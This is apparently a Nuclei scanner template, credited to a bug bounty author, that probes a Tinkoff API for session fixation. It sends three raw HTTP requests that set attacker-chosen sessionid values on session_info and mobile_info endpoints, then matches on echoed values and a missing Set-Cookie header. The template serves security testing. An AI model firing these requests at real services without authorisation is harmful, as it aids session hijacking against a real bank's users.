id: tinkoff-session-fixation

info:
  name: Tinkoff - Session Fixation
  author: bugbounty
  severity: high
  description: Session fixation via sessionid parameter manipulation
  tags: session,fixation,tinkoff

http:
  - raw:
      - |
        GET /api/common/v1/session_info?platform=web&sessionid=ATTACKER_SESSION_ID HTTP/1.1
        Host: {{Hostname}}

      - |
        GET /api/common/v1/mobile_info?platform=android&sessionid=FIXED_SESSION_12345 HTTP/1.1
        Host: {{Hostname}}

      - |
        POST /api/common/v1/session_info HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"platform":"web","sessionid":"ATTACKER_CONTROLLED"}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 201

      - type: word
        part: body
        words:
          - "sessionid"
          - "ATTACKER"
          - "FIXED"
        condition: or

      - type: word
        part: header
        words:
          - "Set-Cookie"
        negative: true
